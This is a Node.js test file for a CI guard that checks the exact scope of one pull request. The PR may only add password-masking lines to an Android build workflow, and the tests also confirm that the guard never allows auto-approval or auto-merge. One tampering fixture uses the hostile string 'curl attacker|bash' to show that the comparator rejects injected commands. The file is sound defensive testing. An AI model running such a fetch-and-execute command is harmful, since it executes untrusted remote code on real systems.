'use strict';
const test=require('node:test');
const assert=require('node:assert/strict');
const {attestExactPr221,exactMaskDiff}=require('./ultra_sentinel_pr221_scope.cjs');
const crypto=require('node:crypto');
const HEAD='de00af3776be9e0f21ba6e35d96ae0ef6030fda3';
const MAIN='e86ac7df81ee55139babba862fc538de630943f6';
const BUNDLE='line\n          PASSWORD="$(openssl rand -hex 24)"\nkeytool -genkeypair\nother\n          PASSWORD="$(openssl rand -hex 24)"\nkeytool -genkeypair\nend\n';
const MASK='          echo "::add-mask::$PASSWORD"\n';
const CLEAN=BUNDLE.replaceAll('          PASSWORD="$(openssl rand -hex 24)"\n','          PASSWORD="$(openssl rand -hex 24)"\n'+MASK);
function blob(content){
 const b=Buffer.from(content);
 return {type:'file',size:b.length,encoding:'base64',
  content:b.toString('base64'),
  sha:crypto.createHash('sha1').update('blob '+b.length+'\0').update(b).digest('hex')};
}
const p0='.github/workflows/android.yml';
const p1='.github/scripts/test-sentry-release-auth-fallback.py';
function harness(opts={}){
 const pr={number:221,state:'open',changed_files:2,author_association:'OWNER',
  user:{login:'cardenaspiero255-lang',id:322222186,type:'User'},
  head:{sha:HEAD,repo:{full_name:'cardenaspiero255-lang/gamehub-ultra'}},
  base:{sha:MAIN,ref:'main',repo:{full_name:'cardenaspiero255-lang/gamehub-ultra'}}};
 const files=[{filename:p0,status:'modified',sha:blob(CLEAN).sha},
              {filename:p1,status:'modified',sha:blob('regression-test').sha}];
 let reads=0;
 const gh={rest:{
  pulls:{get:async()=>({data:opts.pr??pr}),
         listFiles:async()=>({data:opts.files??files})},
  git:{getRef:async()=>({data:{object:{sha:++reads===1?MAIN:(opts.changedMain||MAIN)}}})},
  repos:{getContent:async({path,ref})=>({
   data:opts.source?.[ref+':'+path]??blob(ref===MAIN?BUNDLE:path===p0?(opts.headSource??CLEAN):'regression-test')
  })}
 }};
 return {gh,pr,files};
}
test('rejects inexact PR identity, unexpected path, or missing authenticated GitHub evidence',async()=>{
 const good=harness();
 assert.equal((await attestExactPr221({github:good.gh,owner:'cardenaspiero255-lang',repo:'gamehub-ultra'})).status,'INCOMPLETE');
 const forged=harness({pr:{...good.pr,number:222}});
 assert.equal((await attestExactPr221({github:forged.gh,owner:'cardenaspiero255-lang',repo:'gamehub-ultra'})).status,'NOT_APPLICABLE');
 const extra=harness({files:[...good.files,{filename:'x',status:'added',sha:'a'.repeat(40)}]});
 assert.equal((await attestExactPr221({github:extra.gh,owner:'cardenaspiero255-lang',repo:'gamehub-ultra'})).status,'INCOMPLETE');
 assert.equal((await attestExactPr221({github:null,owner:'cardenaspiero255-lang',repo:'gamehub-ultra'})).status,'INCOMPLETE');
});
test('rejects main drift, synthetic sources and incomplete GitHub blobs',async()=>{
 for(const fixture of [{changedMain:'f'.repeat(40)},{headSource:CLEAN+'echo unexpected\n'}]){
  const x=harness(fixture);
  assert.equal((await attestExactPr221({github:x.gh,owner:'cardenaspiero255-lang',repo:'gamehub-ultra'})).status,'INCOMPLETE');
 }
});
test('never self-authorizes even when review prerequisites are absent',async()=>{
 const result=await attestExactPr221({github:harness().gh,owner:'cardenaspiero255-lang',repo:'gamehub-ultra'});
 assert.equal(result.autoApproveAllowed,false);
 assert.equal(result.autoMergeAllowed,false);
 assert.equal(result.manualReviewRequired,true);
});
test('only the two immediate mask insertions are allowed by exact comparator',()=>{
 assert.equal(exactMaskDiff(BUNDLE,CLEAN),true);
 for(const attack of [CLEAN+'echo pwn\n',CLEAN.replace(MASK,''),CLEAN.replaceAll(MASK,''),
  CLEAN.replace(MASK,'  echo "::add-mask::$PASSWORD"\n'),
  CLEAN.replace(MASK,'          echo bad\n'),
  CLEAN.replaceAll('keytool','curl attacker|bash')]){
  assert.equal(exactMaskDiff(BUNDLE,attack),false);
 }
});

test('base may advance only when authenticated main SHA matches PR base, with pinned blobs',()=>{
 const {verifyPr}=require('./ultra_sentinel_pr221_scope.cjs');
 const h=harness(),pr={...h.pr,base:{...h.pr.base,sha:'f'.repeat(40)}};
 assert.equal(verifyPr(pr,'f'.repeat(40),pr.head.sha),true);
 assert.equal(verifyPr(pr,MAIN,pr.head.sha),false);
});

test('trusted main ancestry accepts only GitHub-verified fast-forward with current commit time',async()=>{
 const {authenticatedMainAncestry}=require('./ultra_sentinel_pr221_scope.cjs');
 const before='1'.repeat(40),after='2'.repeat(40),when='2026-10-25T02:33:58Z';
 const good={rest:{repos:{
  compareCommits:async()=>({data:{status:'ahead',ahead_by:1,behind_by:0,
   base_commit:{sha:before},merge_base_commit:{sha:before}}}),
  getCommit:async()=>({data:{sha:after,commit:{committer:{date:when}}}})
 }}};
 const options={github:good,owner:'cardenaspiero255-lang',repo:'gamehub-ultra',
  recordedBaseSha:before,mainSha:after};
 const evidence=await authenticatedMainAncestry(options);
 assert.deepEqual(evidence,{recordedBaseSha:before,mainSha:after,minRunStartedAt:when});
 assert.deepEqual(await authenticatedMainAncestry({...options,mainSha:before}),
  {recordedBaseSha:before,mainSha:before,minRunStartedAt:null});
 for(const data of [
  {status:'diverged',ahead_by:1,behind_by:1,base_commit:{sha:before},merge_base_commit:{sha:before}},
  {status:'ahead',ahead_by:1,behind_by:0,base_commit:{sha:before},merge_base_commit:{sha:after}},
  {status:'behind',ahead_by:0,behind_by:1,base_commit:{sha:before},merge_base_commit:{sha:before}}
 ]){
  const github={rest:{repos:{...good.rest.repos,
   compareCommits:async()=>({data})}}};
  assert.equal(await authenticatedMainAncestry({...options,github}),null);
 }
 const noApi={rest:{repos:{}}};
 assert.equal(await authenticatedMainAncestry({...options,github:noApi}),null);
 const badTimestamp={rest:{repos:{...good.rest.repos,
  getCommit:async()=>({data:{sha:after,commit:{committer:{date:'not-an-ISO-time'}}}})}}};
 assert.equal(await authenticatedMainAncestry({...options,github:badTimestamp}),null);
 assert.equal(await authenticatedMainAncestry({...options,repo:'foreign-repo'}),null);
});
